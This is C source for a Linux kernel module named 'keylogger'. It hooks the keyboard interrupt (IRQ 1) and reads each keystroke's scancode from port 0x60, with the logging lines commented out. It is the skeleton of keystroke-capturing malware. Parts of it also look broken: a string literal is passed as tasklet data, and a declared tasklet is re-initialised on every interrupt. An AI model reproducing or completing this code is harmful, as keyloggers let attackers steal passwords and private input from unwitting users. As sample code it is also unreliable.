#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>
#include <asm/io.h>

void* HANDLER_KEY;
static void kl_tasklet_handler(unsigned long flag);
DECLARE_TASKLET(kl_tasklet, kl_tasklet_handler, 0);

static void kl_tasklet_handler(unsigned long flag)
{
	tasklet_disable(&kl_tasklet);
	tasklet_enable(&kl_tasklet);
}

irqreturn_t kl_handler(int irq, void *dev_id)
{

  	static unsigned char scancode;
  	unsigned char status;

	status = inb(0x64);
  	scancode = inb(0x60);

	tasklet_init(&kl_tasklet, kl_tasklet_handler, "dynamic tasklet");
	tasklet_schedule(&kl_tasklet);
	//switch (scancode)
	//{
  	//case 0x01:  printk (KERN_INFO "! You pressed Esc ...\n");
              	//break;
	//case 0x02:  printk (KERN_INFO "! You pressed 1 ...\n");
              	//break;
	//case 0x03:  printk (KERN_INFO "! You pressed 2 ...\n");
              	//break;
	//case 0x04:  printk (KERN_INFO "! You pressed 3 ...\n");
              	//break;
  	//case 0x3B:  printk (KERN_INFO "! You pressed F1 ...\n");
              	//break;
  	//case 0x3C:  printk (KERN_INFO "! You pressed F2 ...\n");
              	//break;
  	//default:
              	//break;
	//}

  	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
    	HANDLER_KEY = (void *)(kl_handler);
    	return request_irq (1, (irq_handler_t) kl_handler,IRQF_SHARED,"keylogger", HANDLER_KEY);
}

static void __exit keylogger_exit(void)
{
	tasklet_kill(&kl_tasklet);
    	free_irq(1, HANDLER_KEY);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
